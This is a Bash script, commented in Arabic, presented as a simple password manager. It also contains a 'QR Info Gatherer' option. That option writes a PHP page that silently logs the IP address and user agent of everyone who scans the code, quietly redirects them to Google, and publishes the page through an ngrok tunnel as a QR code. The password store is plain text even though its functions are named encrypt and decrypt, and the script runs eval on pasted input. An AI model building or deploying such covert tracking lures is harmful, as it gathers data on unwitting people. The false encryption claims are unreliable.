#!/bin/bash

# --- 1. الإعدادات والألوان ---
GREEN="\e[32m"
CYAN="\e[36m"
YELLOW="\e[33m"
RED="\e[31m"
RESET="\e[0m"

DB_FILE="passwords.txt"
TEMP_FILE="passwords.tmp"
LOG_FILE="access_logs.csv"
PHP_SERVER_PORT=8080

# قائمة لتتبع العمليات التي تبدأ في الخلفية
declare -a BACKGROUND_PIDS=()

show_banner() {
	clear
	echo -e "${CYAN}"
	echo "  _   "
	echo " | | \ / _ \ / _| / _| / ___|"
	echo " | |_) | | | | | _ \_ \ \_ \ "
	echo " | _ <| |_| | |_| | _) | _) |"
	echo " |_| \_\\_/ \| |/ |/"
	echo -e "${RESET}"
	echo -e "${RED}========= PASS_RG (SMART INFO GATHERING) MANAGER =========${RESET}"
}

# وظيفة التنظيف عند الخروج
cleanup() {
	echo -e "\n${YELLOW}Stopping background processes...${RESET}"
	# إيقاف عمليات PHP و Ngrok
	if [ ${#BACKGROUND_PIDS[@]} -gt 0 ]; then
		kill ${BACKGROUND_PIDS[@]} 2>/dev/null
	fi
	
	# تنظيف وحفظ البيانات
	encrypt_db
	if [ -f "$TEMP_FILE" ]; then
		shred -u "$TEMP_FILE" 2>/dev/null
	fi
	echo -e "${GREEN}Cleanup complete. Goodbye!${RESET}"
	exit 0
}

# ربط وظيفة التنظيف بأحداث الخروج (Ctrl+C أو إنهاء السكربت)
trap cleanup INT TERM EXIT

# قراءة وحفظ قاعدة البيانات (بدون تغيير)
decrypt_db() {
	if [ ! -f "$DB_FILE" ]; then
		echo "" > "$TEMP_FILE"
		return 0
	fi
	cat "$DB_FILE" > "$TEMP_FILE"
	return 0
}

encrypt_db() {
	cat "$TEMP_FILE" > "$DB_FILE"
}

select_category() {
	echo ""
	echo -e "${CYAN}Choose Category:${RESET}"
	echo "1) Games"
	echo "2) Emails"
	echo "3) Social"
	echo "4) Banking"
	echo "5) Servers"
	echo "6) Custom"
	read -p "Select: " CH
	case "$CH" in
		1) echo "Games" ;;
		2) echo "Emails" ;;
		3) echo "Social" ;;
		4) echo "Banking" ;;
		5) echo "Servers" ;;
		6) read -p "Enter custom category: " CUS; echo "$CUS" ;;
		*) echo "Unknown" ;;
	esac
}

generate_password() {
	local LENGTH=$1
	< /dev/urandom tr -dc 'A-Za-z0-9' | head -c $LENGTH
}

generate_qr() {
	local text="$1"
	local label="$2"
	if ! command -v qrencode &> /dev/null
	then
		echo -e "${RED}❌ qrencode not found. Installing qrencode...${RESET}"
		sudo apt install qrencode -y 
	fi
	local filename="qr_codes/${label}_qr.png"
	
	# تأكد من إنشاء المجلد بصلاحيات مناسبة
	mkdir -p qr_codes 2>/dev/null 
	chmod -R 777 qr_codes 2>/dev/null

	qrencode -o "$filename" "$text"
	echo -e "${GREEN}✔️ QR-Code saved as:${RESET} $filename"
}

# --- 3. وظائف الإعداد التلقائي (Ngrok & PHP) ---

install_dependency() {
	local DEP=$1
	local PACKAGE_NAME=$2
	if ! command -v "$DEP" &> /dev/null; then
		echo -e "${RED}❌ $DEP not found. Installing $PACKAGE_NAME...${RESET}"
		sudo apt update -y > /dev/null
		sudo apt install "$PACKAGE_NAME" -y > /dev/null
		if command -v "$DEP" &> /dev/null; then
			echo -e "${GREEN}✅ $DEP installed successfully.${RESET}"
		else
			echo -e "${RED}❌ Failed to install $DEP. Please install manually.${RESET}"
			exit 1
		fi
	fi
}

install_ngrok_if_needed() {
	install_dependency "php" "php"
	install_dependency "curl" "curl"
	
	if command -v ngrok &> /dev/null; then
		echo -e "${GREEN}✔️ Ngrok is already installed.${RESET}"
		return 0
	fi

	echo -e "${YELLOW}🚨 Ngrok is not found. Attempting installation...${RESET}"
	NGROK_URL="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
	wget "$NGROK_URL" -O ngrok.tgz > /dev/null 2>&1
	tar -xvzf ngrok.tgz > /dev/null 2>&1
	sudo mv ngrok /usr/local/bin/ > /dev/null 2>&1
	chmod +x /usr/local/bin/ngrok
	rm ngrok.tgz
	if command -v ngrok &> /dev/null; then
		echo -e "${GREEN}✅ Ngrok V3 installed successfully.${RESET}"
	else
		echo -e "${RED}❌ Ngrok installation failed. Please install manually.${RESET}"
		exit 1
	fi
}

setup_ngrok_authtoken() {
	local NGROK_CONF="$HOME/.config/ngrok/ngrok.yml"
	if [ -f "$NGROK_CONF" ] && grep -q "authtoken" "$NGROK_CONF"; then
		echo -e "${GREEN}✔️ Ngrok authtoken already configured.${RESET}"
		return 0
	fi
	
	echo -e "\n${YELLOW}=====================================================${RESET}"
	echo -e "${RED}⚠️ NGrok Authtoken Required! (Setup needed once only)${RESET}"
	echo -e "${CYAN}1. Go to: https://dashboard.ngrok.com/signup"
	echo "2. Create a free account and copy your 'Authtoken command'."
	echo "3. Example: ngrok authtoken <YOUR_TOKEN>"
	echo -e "${YELLOW}=====================================================${RESET}"
	
	read -p "Paste your full 'ngrok authtoken ...' command here: " AUTH_COMMAND
	eval "$AUTH_COMMAND"
	
	if [ $? -eq 0 ]; then
		echo -e "${GREEN}✅ Authtoken saved successfully!${RESET}"
	else
		echo -e "${RED}❌ Failed to save Authtoken. Check the command and try again.${RESET}"
		exit 1
	fi
}

start_collector() {
	# 1. تثبيت وتجهيز Ngrok والتأكد من ملفات PHP
	install_ngrok_if_needed
	setup_ngrok_authtoken

	if [ ! -f "collector.php" ]; then
		echo -e "${YELLOW}Creating collector.php...${RESET}"
		# تم إزالة الكلمات التي قد تحمل دلالات غير مرغوب فيها من هنا
		cat <<EOF > collector.php
<?php
date_default_timezone_set('Europe/Berlin');
\$logFile = 'access_logs.csv';
\$time = date('Y-m-d H:i:s');
\$ip = isset(\$_SERVER['REMOTE_ADDR']) ? \$_SERVER['REMOTE_ADDR'] : 'N/A';
\$userAgent = isset(\$_SERVER['HTTP_USER_AGENT']) ? \$_SERVER['HTTP_USER_AGENT'] : 'N/A';
\$userAgent = str_replace(array("\n", "\r", ","), ' ', \$userAgent);
\$logEntry = "\"$time\",\"$ip\",\"$userAgent\",\"N/A\"\n";

if (!file_exists(\$logFile) || filesize(\$logFile) == 0) {
	file_put_contents(\$logFile, "Time,IP,User-Agent,Referer\n");
}
file_put_contents(\$logFile, \$logEntry, FILE_APPEND);
header('Location: https://google.com', true, 303);
exit; 
?>
EOF
		chmod 666 collector.php
	fi
	if [ ! -f "$LOG_FILE" ]; then
		touch "$LOG_FILE"
	fi
	chmod 777 "$LOG_FILE"

	echo -e "\n${CYAN}Starting PHP Server (Background)...${RESET}"
	php -S 127.0.0.1:$PHP_SERVER_PORT > /dev/null 2>&1 &
	BACKGROUND_PIDS+=($!) # حفظ PID
	
	echo -e "${CYAN}Starting Ngrok Tunnel (Background and Auto-URL Extraction)...${RESET}"
	# تشغيل Ngrok في الخلفية (صامت)
	ngrok http $PHP_SERVER_PORT > /dev/null 2>&1 &
	BACKGROUND_PIDS+=($!) # حفظ PID
	
	echo -e "${YELLOW}Waiting for Ngrok tunnel to establish (max 10s)...${RESET}"

	# الانتظار حتى يصبح Ngrok API متاحاً واستخراج الرابط العام
	PUBLIC_URL=""
	for i in $(seq 1 10); do
		API_RESPONSE=$(curl --silent --max-time 1 "http://127.0.0.1:4040/api/tunnels" 2>/dev/null)
		if echo "$API_RESPONSE" | grep -q '"public_url":'; then
			PUBLIC_URL=$(echo "$API_RESPONSE" | grep -o '"public_url":"[^"]*' | head -n 1 | sed 's/"public_url":"//')
			break
		fi
		sleep 1
	done

	if [ -z "$PUBLIC_URL" ]; then
		echo -e "${RED}❌ فشل الحصول على الرابط العام. الرجاء التحقق من حالة Ngrok وإعادة المحاولة.${RESET}"
		return 1
	fi

	# 5. توليد رمز QR
	COLLECTOR_URL="${PUBLIC_URL}/collector.php"
	echo -e "\n${GREEN}✅ تم إنشاء النفق بنجاح!${RESET}"
	echo -e "${GREEN}🔗 عنوانك العام هو: ${YELLOW}${COLLECTOR_URL}${RESET}"
	
	read -p "Enter label for QR Code file: " QR_LABEL
	generate_qr "$COLLECTOR_URL" "$QR_LABEL"
	
	echo -e "\n${RED}❗️ تنبيه: رمز QR يربط بـ:${RESET} $COLLECTOR_URL"
	echo -e "   أي جهاز يمسح هذا الكود سيرسل معلوماته إلى خادمك."
	echo -e "${CYAN}💡 للتحقق من السجلات، ابقَ على السكربت قيد التشغيل واستخدم أمراً جديداً: cat access_logs.csv${RESET}"
	
	# انتظار أي ضغطة زر للعودة للقائمة الرئيسية
	read -n 1 -s -r -p "Press any key to continue..."
}

# --- 4. حلقة البرنامج الرئيسية ---

show_banner
decrypt_db
while true; do
	echo ""
	echo -e "${GREEN}1) Add Password (Manual)"
	echo "2) Generate Password (Random)"
	echo "3) Show Passwords"
	echo "4) Search Passwords"
	echo "5) Delete All Passwords"
	echo "6) Exit${RESET}"
	echo -e "${YELLOW}9) Generate QR Info Gatherer (AUTO/SMART MODE)${RESET}"
	echo ""
	read -p "Choose an option: " CHOICE
	case "$CHOICE" in
		1) # إضافة كلمة مرور يدوياً
			read -p "Label: " LABEL
			CATEGORY=$(select_category)
			read -p "Password: " PASS_INPUT
			echo "[$CATEGORY][$LABEL] $PASS_INPUT" >> "$TEMP_FILE"
			encrypt_db
			echo -e "${GREEN}✔️ Saved.${RESET}"
			;;
		2) # توليد كلمة مرور عشوائية
			read -p "Label: " LABEL
			CATEGORY=$(select_category)
			read -p "Password length: " LEN
			PASS=$(generate_password "$LEN")
			echo "[$CATEGORY][$LABEL] $PASS" >> "$TEMP_FILE"
			encrypt_db
			echo -e "${YELLOW}✔️ Generated:${RESET} $PASS"
			read -p "Generate QR-Code? (y/n): " QR
			if [[ "$QR" == "y" ]]; then
				generate_qr "$PASS" "$LABEL"
			fi
			;;
		3) # عرض كلمات المرور
			echo ""
			nl -w2 -s") " "$TEMP_FILE"
			;;
		4) # بحث
			read -p "Search keyword: " WORD
			echo ""
			grep -i "$WORD" "$TEMP_FILE"
			;;
		5) # حذف الكل
			echo "" > "$TEMP_FILE"
			encrypt_db
			echo -e "${GREEN}✔️ All passwords deleted.${RESET}"
			;;
		6) # خروج (ستنفذ وظيفة cleanup تلقائياً)
			exit
			;;
		9) # الخيار الجديد: منشئ QR لجمع المعلومات (التلقائي)
			start_collector
			;;
		*) echo "Invalid choice."
			;;
	esac
done  
